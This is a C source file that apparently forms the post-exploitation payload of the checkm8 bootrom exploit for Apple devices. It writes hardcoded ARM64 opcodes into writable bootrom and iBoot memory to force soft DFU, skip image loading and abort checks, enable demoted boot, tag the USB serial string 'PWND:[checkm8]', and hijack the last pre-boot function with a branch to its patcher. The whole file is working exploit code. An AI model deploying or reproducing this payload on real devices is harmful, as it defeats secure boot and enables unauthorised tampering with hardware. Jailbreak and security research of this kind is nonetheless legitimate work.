#include "dev/addr.h"
#include "dev/shared_types.h"

#include "bootrom_func.h"

static inline void patch_enter_soft_dfu()
{
    uint32_t *patch = (uint32_t *) 0x1800b2f40;
    *patch = 0x52801408; // mov	w8, #0xa0
}

static inline void patch_remove_dfu_img_load()
{
    uint32_t *patch = (uint32_t *) 0x1800b3518;
    *patch = 0xd2800000; // mov x0, 0x0
}

GLOBAL_STR(patch_format_str,
           "SDOM:%02X CPID:%04X CPRV:%02X CPFM:%02X SCEP:%02X BDID:%02X ECID:%016llX IBFL:%02X PWND:[checkm8]")

static inline void patch_iserial()
{
    int i, len;
    char *base = (char *) 0x1800b0140;
    for(len = 0; GET_GLOBAL_AT(patch_format_str, len) != 0; len++);

    for(i = 0; i < len; i++)
        base[i] = GET_GLOBAL_AT(patch_format_str, i);

    uint32_t *patch = (uint32_t *) 0x1800db4cc;
    *patch = 0x10ea63a4; // adr x4, -0x2b38c
}

static inline void patch_boot_after_abort()
{
    uint32_t *patch = (uint32_t *) 0x1800b34e0;
    *patch = 0xd503201f; // nop;
}

static inline void patch_jump_to_pongo()
{
    *((uint32_t *) 0x1800d5eec) = 0xd63f0000; // blr x0
}

static inline void patch_enable_demote_boot()
{
    uint32_t *patch = (uint32_t *) 0x1800c29ec;
    *patch = 0x52800029;    // mov  w9, #0x1
}

PAYLOAD_SECTION
void patch_function()
{
    patch_enter_soft_dfu();
    patch_remove_dfu_img_load();
    patch_iserial();
    patch_boot_after_abort();
//    patch_jump_to_pongo();

//    patch_enable_demote_boot();
}

void _start()
{
    // select regular mode for next boot
    *(uint32_t *) (WRITEABLE_ROM((void *) 0x100000664)) =
            0xd2800000; // mov x0, 0x0

    // enable demoted boot
    *(uint32_t *) (WRITEABLE_ROM((void *) 0x100006c54)) =
            0xd2800020; // mov x0, 0x1

    // hook into the last function before boot to patch iBoot
    uint64_t patch_addr;
    __asm__ volatile ("adr %0, patch_function" : "=r" (patch_addr));

    // we overwrite part of the previous function with the patcher address,
    // however this is okay for three reasons
    //  1. the previous function is only used when the bootrom is initialized
    //  2. the function we're stealing does nothing
    //  3. the function we're stealing is the last one called before running iBoot
    *(uint64_t *) (WRITEABLE_ROM((void *) 0x10000b9b8)) = patch_addr;
    *(uint32_t *) (WRITEABLE_ROM((void *) 0x10000b9c0)) = 0x58ffffc0; // ldr x0, -8
    *(uint32_t *) (WRITEABLE_ROM((void *) 0x10000b9c4)) = 0xd61f0000; // br x0

    __asm__ volatile ("ic iallu\ndsb sy\nisb");

    *((int *) ADDR_DFU_RETVAL) = -1;
    *((char *) ADDR_DFU_STATUS) = 1;
    event_notify((struct event *) ADDR_DFU_EVENT);
}